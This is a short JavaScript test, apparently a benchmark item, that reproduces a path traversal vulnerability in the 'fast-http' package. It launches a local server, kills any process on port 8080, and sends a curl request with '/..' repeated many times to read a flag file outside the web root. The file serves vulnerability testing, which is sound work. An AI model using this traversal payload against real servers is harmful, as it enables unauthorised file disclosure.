const path = require('path');
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v16 = '/..'.repeat(50);
    const v17 = v16 + pathToFlag;
    return v17;
};
const v29 = done => {
    const v18 = expect.assertions(1);
    v18;
    const Server = require('fast-http');
    const fs = require('fs');
    const v19 = require('child_process');
    const exec = v19.exec;
    const execSync = v19.execSync;
    const v20 = fs.readFileSync(pathToFlag);
    let hostsFile = v20.toString();
    const a = require('child_process');
    try {
        const v21 = () => {
        };
        const v22 = a.execSync('fuser -k 8080/tcp', v21);
        v22;
    } catch (e) {
    }
    let srv = new Server(8080, './', true);
    const v23 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${ v23 }"`;
    const v27 = (error, stdout) => {
        const v24 = expect(stdout);
        const v25 = v24.toBe(hostsFile);
        v25;
        const v26 = done();
        v26;
    };
    const v28 = exec(attack_string, v27);
    v28;
};
const v30 = test('Path Traversal in fast-http', v29);
v30;